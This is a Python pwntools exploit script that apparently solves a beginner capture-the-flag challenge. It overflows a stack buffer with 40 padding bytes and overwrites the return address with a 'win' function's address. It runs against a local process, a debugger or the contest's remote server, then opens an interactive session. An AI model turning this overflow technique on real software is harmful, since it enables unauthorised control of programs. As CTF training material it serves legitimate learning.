#!/usr/bin/env python3
# -*- coding:utf-8 -*

from pwn import *
from sys import argv
from time import sleep

context.terminal = ['tmux', 'sp', '-h']
context.log_level = "debug"

chall = "./chall"
#libc = ELF()
elf = ELF(chall)
context.binary = chall
context.binary.checksec()

if len(argv) >= 2 and argv[1] == "r":
    p = remote("beginnersbof.quals.beginners.seccon.jp", 9000)
elif len(argv) >= 2 and argv[1] == "d":
	cmd = """
		b main+178
		c
	"""
	p = gdb.debug(chall,cmd)
else:
    p = process(chall)


win_func_addr = elf.symbols['win']

payload = b"A" * 8 * 5
payload += p64(win_func_addr)

p.recvuntil("How long is your name?")
p.sendline(str(len(payload) + 2))
p.recvuntil("What's your name?")
p.sendline(payload)

p.interactive()
